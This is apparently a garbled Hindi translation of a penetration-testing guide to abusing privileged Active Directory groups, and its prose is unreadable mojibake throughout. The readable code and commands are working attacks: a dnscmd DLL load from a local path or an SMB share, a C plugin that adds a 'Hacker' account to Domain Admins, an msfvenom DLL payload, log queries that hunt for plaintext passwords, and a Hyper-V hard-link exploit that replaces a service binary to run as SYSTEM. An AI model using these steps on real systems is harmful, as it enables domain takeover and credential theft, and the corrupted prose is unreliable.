* [**ServerLevelPluginDll**](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) рд╣рдореЗрдВ DLL рдХреЗ рдкрде рдХреА **рд╢реВрдиреНрдп рд╕рддреНрдпрд╛рдкрди** рдХреЗ рд╕рд╛рде рдПрдХ рдХрд╕реНрдЯрдо **DLL** **рд▓реЛрдб** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрд╣ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рд╕реЗ `dnscmd` рдЯреВрд▓ рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ
* рдЬрдм **`DnsAdmins`** рд╕рдореВрд╣ рдХрд╛ рдПрдХ рд╕рджрд╕реНрдп рдиреАрдЪреЗ рджрд┐рдП рдЧрдП **`dnscmd`** рдХрдорд╛рдВрдб рдХреЛ рдЪрд▓рд╛рддрд╛ рд╣реИ, рддреЛ `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рднрд░ рдЬрд╛рддреА рд╣реИ
* рдЬрдм **DNS рд╕реЗрд╡рд╛ рдХреЛ рдкреБрдирдГ рдЖрд░рдВрдн рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рдЗрд╕ рдкрде рдореЗрдВ **DLL** **рд▓реЛрдб** рдХреА рдЬрд╛рдПрдЧреА (рдпрд╛рдиреА, рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рд╢реЗрдпрд░ рдЬрд┐рд╕реЗ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреЗ рдорд╢реАрди рдЦрд╛рддреЗ рддрдХ рдкрд╣реБрдБрдЪ рд╣реЛ рд╕рдХрддреА рд╣реИ)
* рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ **рдХрд╕реНрдЯрдо DLL рд▓реЛрдб рдХрд░рдХреЗ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ Mimikatz рдЬреИрд╕реЗ рдЯреВрд▓ рдХреЛ DLL рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЛрдб рдХрд░рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдбрдВрдк рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рд╕рдореВрд╣ рдХреЗ **рд╕рджрд╕реНрдпреЛрдВ** рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### рдордирдорд╛рдиреА DLL рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **DNSAdmins рд╕рдореВрд╣** рдореЗрдВ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реИ, рддреЛ рдЖрдк **DNS рд╕рд░реНрд╡рд░ рдХреЛ SYSTEM рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдордирдорд╛рдиреА DLL рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** (DNS рд╕реЗрд╡рд╛ `NT AUTHORITY\SYSTEM` рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рддреА рд╣реИ)ред рдЖрдк DNS рд╕рд░реНрд╡рд░ рдХреЛ **рд╕реНрдерд╛рдиреАрдп рдпрд╛ рджреВрд░рд╕реНрде** (SMB рджреНрд╡рд╛рд░рд╛ рд╕рд╛рдЭрд╛ рдХреА рдЧрдИ) DLL рдлрд╝рд╛рдЗрд▓ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╣реБрдП рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
```
рдПрдХ рдорд╛рдиреНрдп DLL рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдЖрдк [https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL) рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдореИрдВ `DnsPluginInitialize` рдлрдВрдХреНрд╢рди рдХреЗ рдХреЛрдб рдХреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдмрджрд▓реВрдВрдЧрд╛:
```c
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```
рдпрд╛ рдЖрдк msfvenom рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ dll рдЬрдирд░реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
рддреЛ, рдЬрдм **DNSservice** рд╢реБрд░реВ рдпрд╛ рдкреБрдирдГ рдЖрд░рдВрдн рд╣реЛрддреА рд╣реИ, рдПрдХ рдирдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

DNSAdmin рд╕рдореВрд╣ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрдж рдЖрдк **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ DNS рд╕реЗрд╡рд╛ рдХреЛ рд░реЛрдХ рдирд╣реАрдВ рд╕рдХрддреЗ рдФрд░ рдкреБрдирдГ рдЖрд░рдВрдн рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред** рд▓реЗрдХрд┐рди рдЖрдк рд╣рдореЗрд╢рд╛ рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
[**ired.team рдореЗрдВ рдЗрд╕ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХреЗрд▓реЗрд╢рди рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЬрд╛рдиреЗрдВред**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)

#### Mimilib.dll

рдЗрд╕ [**рдкреЛрд╕реНрдЯ**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) рдореЗрдВ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, `Mimikatz` рдЯреВрд▓ рдХреЗ рдирд┐рд░реНрдорд╛рддрд╛ рджреНрд╡рд╛рд░рд╛ [**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ [**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) **** рдлрд╛рдЗрд▓ рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░рдХреЗ рдХрдорд╛рдВрдб рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдЬрд┐рд╕рд╕реЗ **рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓** рд╡рди-рд▓рд╛рдЗрдирд░ рдпрд╛ рд╣рдорд╛рд░реА рдкрд╕рдВрдж рдХрд╛ рдХреЛрдИ рдЕрдиреНрдп рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### WPAD рд░рд┐рдХреЙрд░реНрдб рдХреЗ рд▓рд┐рдП MitM

DnsAdmins рд╕рдореВрд╣ рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ **WPAD рд░рд┐рдХреЙрд░реНрдб** рдмрдирд╛рдирд╛ рд╣реИред рдЗрд╕ рд╕рдореВрд╣ рдХреА рд╕рджрд╕реНрдпрддрд╛ рд╣рдореЗрдВ [рдЧреНрд▓реЛрдмрд▓ рдХреНрд╡реЗрд░реА рдмреНрд▓реЙрдХ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps) рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рджреЗрддреА рд╣реИ, рдЬреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рддреА рд╣реИред рд╕рд░реНрд╡рд░ 2008 рдиреЗ рдкрд╣рд▓реА рдмрд╛рд░ DNS рд╕рд░реНрд╡рд░ рдкрд░ рдЧреНрд▓реЛрдмрд▓ рдХреНрд╡реЗрд░реА рдмреНрд▓реЙрдХ рд╕реВрдЪреА рдореЗрдВ рдЬреЛрдбрд╝рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреЗрд╢ рдХреАред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рд╡реЗрдм рдкреНрд░реЙрдХреНрд╕реА рдСрдЯреЛрдореИрдЯрд┐рдХ рдбрд┐рд╕реНрдХрд╡рд░реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (WPAD) рдФрд░ рдЗрдВрдЯреНрд░рд╛-рд╕рд╛рдЗрдЯ рдСрдЯреЛрдореИрдЯрд┐рдХ рдЯрдирд▓ рдПрдбреНрд░реЗрд╕рд┐рдВрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (ISATAP) рдЧреНрд▓реЛрдмрд▓ рдХреНрд╡реЗрд░реА рдмреНрд▓реЙрдХ рд╕реВрдЪреА рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВред рдпреЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдХрд╛рдлреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛрддреЗ рд╣реИрдВ, рдФрд░ рдХреЛрдИ рднреА рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрди рдирд╛рдореЛрдВ рд╡рд╛рд▓реА рдХрдВрдкреНрдпреВрдЯрд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдпрд╛ DNS рд░рд┐рдХреЙрд░реНрдб рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред

**рдЧреНрд▓реЛрдмрд▓ рдХреНрд╡реЗрд░реА** рдмреНрд▓реЙрдХ рд╕реВрдЪреА рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдФрд░ **WPAD рд░рд┐рдХреЙрд░реНрдб** рдмрдирд╛рдиреЗ рдХреЗ рдмрд╛рдж, **рд╣рд░ рдорд╢реАрди** рдЬреЛ WPAD рдХреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛ рд░рд╣реА рд╣реИ, рдЙрд╕рдХрд╛ **рдЯреНрд░реИрдлрд┐рдХ рд╣рдорд╛рд░реА рд╣рдорд▓рд╛ рдорд╢реАрди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░реЙрдХреНрд╕реА рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред рд╣рдо \*\*\*\* [**Responder**](https://github.com/lgandx/Responder) **рдпрд╛** [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **рдЬреИрд╕реЗ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЯреНрд░реИрдлрд┐рдХ рд╕реНрдкреВрдлрд┐рдВрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢реЗрдЬ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдСрдлрд╝рд▓рд╛рдЗрди рдХреНрд░реИрдХ рдХрд░рдиреЗ рдпрд╛ SMBRelay рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## рдЗрд╡реЗрдВрдЯ рд▓реЙрдЧ рд░реАрдбрд░реНрд╕

[**рдЗрд╡реЗрдВрдЯ рд▓реЙрдЧ рд░реАрдбрд░реНрд╕**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) **** рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдпреЛрдВ рдХреЛ **рдЗрд╡реЗрдВрдЯ рд▓реЙрдЧреНрд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реЛрддреА рд╣реИ (рдЬреИрд╕реЗ рдХрд┐ рдирдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдирд┐рд░реНрдорд╛рдг рд▓реЙрдЧреНрд╕)ред рд▓реЙрдЧреНрд╕ рдореЗрдВ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рдорд┐рд▓ рд╕рдХрддреА рд╣реИред рдЖрдЗрдП рджреЗрдЦреЗрдВ рдХрд┐ рд▓реЙрдЧреНрд╕ рдХреЛ рдХреИрд╕реЗ рджреЗрдЦрд╛ рдЬрд╛рдП:
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Event Log Readers"

# To find "net [...] /user:blahblah password"
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Using other users creds
wevtutil qe Security /rd:true /f:text /r:share01 /u:<username> /p:<pwd> | findstr "/user"

# Search using PowerShell
Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
## Exchange Windows рдЕрдиреБрдорддрд┐рдпрд╛рдБ

рд╕рджрд╕реНрдпреЛрдВ рдХреЛ **рдбреЛрдореЗрди рдСрдмреНрдЬреЗрдХреНрдЯ рдкрд░ DACL рд▓рд┐рдЦрдиреЗ рдХреА рдХреНрд╖рдорддрд╛** рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рддреА рд╣реИред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ** [**DCSync**](dcsync.md) рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддрд╛ рд╣реИред\
рдпрджрд┐ Microsoft Exchange AD рдкрд░реНрдпрд╛рд╡рд░рдг рдореЗрдВ рд╕реНрдерд╛рдкрд┐рдд рд╣реИ, рддреЛ рдЗрд╕ рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЛрдВ рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдХрдВрдкреНрдпреВрдЯрд░реЛрдВ рдХреЛ рдкрд╛рдпрд╛ рдЬрд╛рдирд╛ рд╕рд╛рдорд╛рдиреНрдп рд╣реИред

рдпрд╣ [**GitHub рд░реЗрдкреЛ**](https://github.com/gdedrouas/Exchange-AD-Privesc) рдХреБрдЫ **рддрдХрдиреАрдХреЛрдВ** рдХреЛ рд╕рдордЭрд╛рддрд╛ рд╣реИ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕ рд╕рдореВрд╣ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V рдкреНрд░рд╢рд╛рд╕рдХ

[**Hyper-V рдкреНрд░рд╢рд╛рд╕рдХ**](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) рд╕рдореВрд╣ рдХреЛ [Hyper-V рд╕реБрд╡рд┐рдзрд╛рдУрдВ](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines) рдХреА рдкреВрд░реА рдкрд╣реБрдВрдЪ рд╣реЛрддреА рд╣реИред рдпрджрд┐ **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕** рдХреЛ **рд╡рд░реНрдЪреБрдЕрд▓рд╛рдЗрдЬрд╝** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ **рд╡рд░реНрдЪреБрдЕрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ** рдХреЛ **рдбреЛрдореЗрди рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ** рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рдирд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рд╡реЗ рдЖрд╕рд╛рдиреА рд╕реЗ **рдЬреАрд╡рд┐рдд рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреА рдПрдХ рдХреНрд▓реЛрди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рд╡рд░реНрдЪреБрдЕрд▓ **рдбрд┐рд╕реНрдХ** рдХреЛ рдСрдлрд▓рд╛рдЗрди **рдорд╛рдЙрдВрдЯ** рдХрд░рдХреЗ **`NTDS.dit`** рдлрд╛рдЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдбреЛрдореЗрди рдореЗрдВ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП NTLM рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢реЗрдЬ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ [рдмреНрд▓реЙрдЧ](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/) рдкрд░ рднреА рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди рдХреЛ **рд╣рдЯрд╛рдиреЗ** рдкрд░, `vmms.exe` рд╕рдВрдмрдВрдзрд┐рдд **`.vhdx` рдлрд╛рдЗрд▓** рдкрд░ **рдореВрд▓ рдлрд╛рдЗрд▓ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдкреБрдирдГрд╕реНрдерд╛рдкрд┐рдд** рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╡рд╣ `NT AUTHORITY\SYSTEM` рдХреЗ рд░реВрдк рдореЗрдВ рдРрд╕рд╛ рдХрд░рддрд╛ рд╣реИ, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдирдХрд▓ рдХрд┐рдП рдмрд┐рдирд╛ред рд╣рдо **`.vhdx`** рдлрд╛рдЗрд▓ рдХреЛ **рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЗрд╕ рдлрд╛рдЗрд▓ рдХреЛ рдПрдХ **рд╕реБрд░рдХреНрд╖рд┐рдд SYSTEM рдлрд╛рдЗрд▓** рдХреА рдУрд░ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдореВрд▓ **рд╣рд╛рд░реНрдб рд▓рд┐рдВрдХ рдмрдирд╛** рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЖрдкрдХреЛ рдЗрд╕ рдкрд░ рдкреВрд░реА рдЕрдиреБрдорддрд┐рдпрд╛рдВ рджреА рдЬрд╛рдПрдВрдЧреАред

рдпрджрд┐ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) рдпрд╛ [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841) рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИ, рддреЛ рд╣рдо рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SYSTEM рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдиреНрдпрдерд╛, рд╣рдо **рд╕рд░реНрд╡рд░ рдкрд░ рдПрдХ рдРрд╕реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рд▓рд╛рдн рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ SYSTEM рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЪрд▓рдиреЗ рд╡рд╛рд▓реА рдПрдХ рд╕реЗрд╡рд╛ рд╕реНрдерд╛рдкрд┐рдд рд╣реИ**, рдЬрд┐рд╕реЗ рдЕрдзрд┐рдХрд╛рд░рд╣реАрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рд╢реБрд░реВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### **рд╢реЛрд╖рдг рдЙрджрд╛рд╣рд░рдг**

рдЗрд╕рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг **Firefox** рд╣реИ, рдЬреЛ **`Mozilla Maintenance Service`** рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИред рд╣рдо [рдЗрд╕ рд╢реЛрд╖рдг](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (NT рд╣рд╛рд░реНрдб рд▓рд┐рдВрдХ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рдорд╛рдг-рд╕рдВрдХрд▓реНрдк) рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╣рдорд╛рд░реЗ рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдиреАрдЪреЗ рджреА рдЧрдИ рдлрд╛рдЗрд▓ рдкрд░ рдкреВрд░реА рдЕрдиреБрдорддрд┐рдпрд╛рдВ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛ рд╕рдХреЗрдВ:
```bash
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **рдлрд╛рдЗрд▓ рдХрд╛ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рд▓реЗрдирд╛**

PowerShell рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдореЗрдВ **рдЗрд╕ рдлрд╛рдЗрд▓ рдкрд░ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг рдорд┐рд▓ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рд╣рдо рдЗрд╕рдХрд╛ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рд▓реЗ рд╕рдХрддреЗ рд╣реИрдВ**ред
```bash
C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **Mozilla Maintenance Service рд╢реБрд░реВ рдХрд░рдирд╛**

рдЗрд╕рдХреЗ рдмрд╛рдж, рд╣рдо рдЗрд╕ рдлрд╛рдЗрд▓ рдХреЛ **рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг `maintenanceservice.exe`** рд╕реЗ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рдореЗрдВрдЯреЗрдиреЗрдВрд╕ **рд╕рд░реНрд╡рд┐рд╕ рдХреЛ рд╢реБрд░реВ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ SYSTEM рдХреЗ рд░реВрдк рдореЗрдВ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
C:\htb> sc.exe start MozillaMaintenance
```
{% hint style="info" %}
рдЗрд╕ рд╡реЗрдХреНрдЯрд░ рдХреЛ рдорд╛рд░реНрдЪ 2020 рд╡рд┐рдВрдбреЛрдЬ рд╕реБрд░рдХреНрд╖рд╛ рдЕрдкрдбреЗрдЯреНрд╕ рджреНрд╡рд╛рд░рд╛ рдХрдо рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд┐рд╕рдиреЗ рд╣рд╛рд░реНрдб рд▓рд┐рдВрдХреНрд╕ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╡реНрдпрд╡рд╣рд╛рд░ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рдХрд┐рдпрд╛ рд╣реИред
{% endhint %}

## рд╕рдВрдЧрдарди рдкреНрд░рдмрдВрдзрди

рдпрд╣ рд╕рдореВрд╣ **Microsoft Exchange** рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдкрд░реНрдпрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ рднреА рд╣реЛрддрд╛ рд╣реИред\
рдЗрд╕ рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп **рд╕рднреА** рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ **рдореЗрд▓рдмреЙрдХреНрд╕** рддрдХ **рдкрд╣реБрдБрдЪ** рд╕рдХрддреЗ рд╣реИрдВред\
